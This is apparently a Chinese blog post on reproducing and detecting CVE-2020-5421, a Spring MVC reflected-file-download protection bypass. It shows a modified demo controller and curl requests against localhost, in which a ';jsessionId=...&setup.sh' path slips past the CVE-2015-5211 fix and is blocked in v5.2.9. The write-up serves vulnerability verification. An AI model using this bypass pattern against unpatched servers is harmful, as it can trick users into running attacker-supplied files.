# CVE-2020-5421 的复现和检测方法探寻 

### **思路**
为确认对CVE-2020-5421 的复现和检测方法的有效性，需要从对修复CVE-2015-5211的版本做测试，测试它能有效阻止攻击的结果，并对应找到能通过jsessionId 绕过防护的路径。也就是说先在CVE-2015-5211修复版先复现5421的漏洞，然后再用该方法到5421的修复版去检验修复的有效性。

### **找一个小白鼠**
Spring framework中虽包含了丰富的单元测试，但作为对观察整体效果的直观性没太大帮助，那只是开发人员在开发内的证明手段。所以要有最直接的效果就是用它开发一个简单示例然后通过攻击进行验证。只需要简单测试，拿一个github上已有的小白鼠直接开始就够了。在github 上[Project](https://github.com/motikan2010/CVE-2020-5398),稍作修改可以用于这一用途。 

将其代码修改为只是输出contents 中的内容
```
    @RequestMapping(value = {"/"}, method = RequestMethod.GET)
    public ResponseEntity<String> download(@RequestParam("filename") String fileName, @RequestParam("contents") String contents) {

        // Make file name in response header
/*        ContentDisposition contentDisposition = ContentDisposition.builder("attachment")
                .filename(fileName + ".txt") // Secure .txt file
                .build();
        HttpHeaders headers = new HttpHeaders();
        headers.setContentDisposition(contentDisposition);*/

        // Download contents
        return ResponseEntity.ok()
                //.headers(headers)
                //.contentType(MediaType.parseMediaType("application/octet-stream"))
                .body(contents);
    }
```

然后编译运行

```
./gradlew bootRun
```



### **现象记录**

1.  正常访问
```
curl "http://localhost:8080/?filename=sample&contents=Hello,%20World" --dump-header -
HTTP/1.1 200 
Content-Type: text/plain;charset=UTF-8
Content-Length: 12
Date: Wed, 23 Sep 2020 07:34:47 GMT

Hello, World
```
2. 增加;setup.sh加入攻击，但被处理掉

```
curl "http://localhost:8080/;setup.sh?filename=sfef&e&contents=inject%20some%20commands%20here" --dump-header -
HTTP/1.1 200 
Content-Disposition: inline;filename=f.txt
Content-Type: text/plain;charset=UTF-8
Content-Length: 25
Date: Wed, 23 Sep 2020 08:11:25 GMT

inject some commands here
```


3. 成功绕过安全处理
```
curl "http://localhost:8080/;jsessionId=sesssion&setup.sh?filename=sfef&contents=inject%20some%20commands%20here" --dump-header -
HTTP/1.1 200 
Content-Type: text/plain;charset=UTF-8
Content-Length: 25
Date: Wed, 23 Sep 2020 08:13:09 GMT

inject some commands here
```

4. 关键字";jsessionId="很**关键**  
如果错误或位置不对都将被不能绕过
```
curl "http://localhost:8080/;jxsessionId=sesssion&setup.sh?filename=sfef&contents=inject%20some%20commands%20here" --dump-header -
HTTP/1.1 200 
Content-Disposition: inline;filename=f.txt
Content-Type: text/plain;charset=UTF-8
Content-Length: 25
Date: Wed, 23 Sep 2020 08:19:13 GMT

inject some commands here
```
以上写成了;jxsessionId=就不能被绕过了

[参考示例代码](https://github.com/wangmengqiang001/CVE-2020-5421/tree/c_2015_5211)

查看一下所用的springframework的版本，发现是:v5.2.2 这是一个修改过CVE-2015-5211的版本，把版本更换为v5.2.9 (最近发布的修改过CVE-2020-5421) 再做第3点测试,结果是：


```
curl "http://localhost:8080/;jsessionId=sesssion&setup.sh?filename=sfef&contents=inject%20some%20commands%20here" --dump-header -
HTTP/1.1 200 
Content-Disposition: inline;filename=f.txt
Content-Type: text/plain;charset=UTF-8
Content-Length: 25
Date: Wed, 23 Sep 2020 08:56:49 GMT

inject some commands here
```
这时通过;jsessionId=已经绕不过安全限制了。

[参考示例代码](https://github.com/wangmengqiang001/CVE-2020-5421/tree/master)

### **结果说明**
经过两个版本的对比，可以证明<url>;jsessionId=ssfe&setup.sh?<通过参数注入命令>，这是复现和检测CVE-2020-5421的有效手段。

[前一篇](https://www.jianshu.com/p/2d25ea8b49d9)

### 参考
[CVE-2020-5421: RFD Protection Bypass via jsessionid](https://tanzu.vmware.com/security/cve-2020-5421)  
[CVE-2020-5398 - RFD(Reflected File Download) Attack for Spring MVC](https://github.com/motikan2010/CVE-2020-5398)

